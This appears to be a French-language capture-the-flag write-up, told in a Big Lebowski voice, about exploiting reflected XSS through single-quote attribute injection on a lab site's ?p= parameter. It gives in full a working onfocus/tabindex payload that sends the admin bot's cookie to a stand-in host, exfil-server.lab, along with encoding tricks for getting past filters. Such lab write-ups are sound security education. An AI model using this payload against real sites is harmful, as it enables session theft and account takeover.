---
layout: default
---

# Le lien qui te cogne en retour

## Le Duc a un plan

J'etais la, tranquille, un White Russian a la main, en train de regarder les challenges web sur une plateforme de secu. Rien de bien meche. Et puis je tombe sur ce truc : une injection reflechie, difficulte moyenne. Je me dis, ca va, c'est dimanche, j'ai nulle part ou etre, autant cliquer.

Le site s'appelle "Valhalla Inc." -- un vendeur de dieux nordiques. Odin, Thor, Freya, le pack complet. Des pages classiques : home, prices, about, contact, et un formulaire de report pour signaler des URLs a un admin. Ca sent le bot headless a plein nez. Ca sent la XSS reflechie. Et comme dirait quelqu'un de beaucoup plus avise que moi : quelques fois c'est toi qui cognes le bar, et quelques fois c'est le bar qui te cogne. On va voir de quel cote ca tombe.

## Reconnaissance : on prend son temps

Je commence par regarder le code source des pages. Le parametre `?p=` controle la navigation : `?p=home`, `?p=prices`, etc. Et la, dans le HTML, je repere une page commentee :

```html
<!-- <a href="?p=security">security</a> -->
```

Cachee dans le menu. Bien. Je note ca dans un coin. Plus interessant : quand je mets un parametre bidon genre `?p=nimportequoi`, je tombe sur une 404 et le site reflete ma valeur dans le HTML :

```html
<a href='?p=nimportequoi'>nimportequoi</a>
```

Mon texte est renvoye dans un attribut `href` entre guillemets simples ET dans le contenu de la balise. Classique. Je tente `?p=<script>alert(1)</script>` pour voir. Evidemment, les chevrons sont encodes : `&lt;` et `&gt;`. Pas de balise injectee. Mais... les apostrophes ? Je teste `?p=test'bidule` et je recois :

```html
<a href='?p=test'bidule'>test'bidule</a>
```

L'apostrophe passe telle quelle. L'attribut `href` est casse net. On a une injection d'attributs. C'est pas grand-chose mais c'est honnete.

## Le plan : onfocus, fragment, exfiltration

L'idee est simple. Si je peux injecter des attributs dans la balise `<a>`, je peux y coller un gestionnaire d'evenement. Le `onfocus` est parfait : il se declenche quand l'element recoit le focus. Pour forcer le focus, j'utilise un fragment d'URL (`#id`) qui cible un element avec `tabindex`.

La structure du payload :

```
?p=x' id='c1' tabindex='0' onfocus='CODE_JS
```

Ce qui genere :

```html
<a href='?p=x' id='c1' tabindex='0' onfocus='CODE_JS'>x' id='c1' ...</a>
```

Le `href` se ferme a la premiere apostrophe de ma chaine. Tout le reste devient des attributs legitimes de la balise. Si j'ajoute `#c1` a la fin de l'URL, le navigateur scrolle vers l'element et lui donne le focus. Le `onfocus` se declenche. Le JavaScript s'execute.

Pour l'exfiltration du cookie, une redirection vers un serveur que je controle :

```
document.location=`https://exfil-server.lab/?c=`.concat(encodeURIComponent(document.cookie))
```

Le cookie du bot admin devrait contenir le flag. Plus qu'a envoyer le tout via le formulaire de report. Facile. En theorie.

## Les fausses pistes, ou quand rien ne va

### Le piege du signe `+`

Premier reflexe pour la concatenation : `+`. Sauf que non. PHP decode les `+` dans les query strings comme des espaces. Mon `+encodeURIComponent(document.cookie)` devient ` encodeURIComponent(document.cookie)`. JavaScript invalide. Le navigateur voit un espace inattendu et rien ne s'execute.

J'ai passe un moment a fixer mon ecran sans comprendre pourquoi le payload ne partait pas. Bon, c'est pas la fin du monde. Rien n'est foutu. Je remplace par `.concat()` et le probleme disparait.

### L'illusion de l'autofocus

Deuxieme idee brillante : coller un `autofocus` sur ma balise `<a>` pour declencher le `onfocus` automatiquement, sans fragment URL. Sauf que les navigateurs ne supportent pas `autofocus` sur les ancres. C'est reserve aux `<input>`, `<textarea>`, `<button>`. Perte de temps seche.

C'est juste, genre... son opinion, au navigateur. Mais il a le dernier mot. Je reviens au plan initial : `#id` avec `tabindex='0'`.

### Les accolades qui disparaissent

J'ai tente des template literals avec `${}` pour l'interpolation. Mauvaise idee : les accolades sont strippees quand elles ne sont pas correctement encodees dans l'URL. Le payload arrive tronque cote serveur. Encore du temps perdu. Je soupire, je bois une gorgee. Bon, `.concat()` fait le meme boulot sans caracteres speciaux problematiques.

### Le bot fantome

Le mecanisme de report a un delai d'environ 8 minutes entre la soumission et la visite du bot. Huit minutes. A chaque test rate, huit minutes d'attente a contempler le plafond. C'est la que j'ai compris la signification profonde du dudisme : la patience n'est pas une vertu, c'est un mode de survie.

### Le cookie invisible

Dernier truc perturbant : aucun cookie visible dans les reponses HTTP. Les headers du site ne montrent rien. J'ai doute un moment -- peut-etre que `document.cookie` ne renvoie rien. Peut-etre que le flag est ailleurs. Mais non : le bot admin est un HeadlessChrome qui arrive avec son propre cookie. On ne le voit jamais cote client normal. Il faut lui faire confiance et tirer.

## Le payload final

Apres toutes ces impasses, le payload qui fonctionne :

```
http://vulnerable-valhalla.lab/?p=x'%20id='c1'%20tabindex='0'%20onfocus='document.location=%60https://exfil-server.lab/?c=%60.concat(encodeURIComponent(document.cookie))#c1
```

Je le soumets via `?p=report&url=URL_ENCODEE`. Huit minutes de meditation plus tard, mon serveur d'exfiltration recoit une requete. Le cookie est la. Le flag est la. The Dude abides.

Pas de cri de joie, pas de danse. Juste un hochement de tete satisfait et une gorgee de White Russian. Ca a pris combien de temps, cette histoire ? On ne compte pas. Il y a beaucoup de tenants, beaucoup d'aboutissants, beaucoup de trucs en suspens. Et a la fin, le tapis va avec la piece.

## Ce qu'on retient

| Concept | Detail |
|---|---|
| **Injection d'attributs HTML** | Quand les chevrons sont filtres mais pas les apostrophes, on peut casser un attribut et en injecter de nouveaux (`id`, `tabindex`, `onfocus`) |
| **Fragment URL pour le focus** | `#id` cible un element avec `tabindex` et declenche `onfocus` sans interaction utilisateur |
| **PHP et le signe `+`** | PHP decode `+` comme un espace dans les query strings -- utiliser `.concat()` au lieu de `+` pour la concatenation JS dans les URLs |
| **`autofocus` limite** | L'attribut `autofocus` n'est supporte que sur les elements de formulaire, pas sur `<a>` |
| **Template literals dans les URLs** | Les `${}` avec accolades non encodees risquent d'etre strippes -- privilegier `.concat()` |
| **Exfiltration via redirection** | `document.location` vers un serveur externe avec le cookie en parametre |
| **Pas de CSP** | L'absence de Content Security Policy permet l'execution de JS inline et la redirection libre |

## References techniques

- [OWASP -- Reflected XSS](https://owasp.org/www-community/attacks/xss/#reflected-xss-attacks)
- [MDN -- onfocus](https://developer.mozilla.org/fr/docs/Web/API/Element/focus_event)
- [MDN -- tabindex](https://developer.mozilla.org/fr/docs/Web/HTML/Global_attributes/tabindex)
- [PortSwigger -- XSS dans les attributs HTML](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-into-html-tag-attributes)
- [PHP -- Traitement des query strings](https://www.php.net/manual/fr/function.urldecode.php)

## Outils utilises

- **Navigateur + DevTools** : inspection du DOM, test des injections
- **Serveur HTTP d'exfiltration** : reception du cookie (Python `http.server` ou equivalent)
- **Formulaire de report du site** : soumission de l'URL au bot admin
- **Encodeur d'URL** : pour verifier l'encodage correct des caracteres speciaux dans le payload
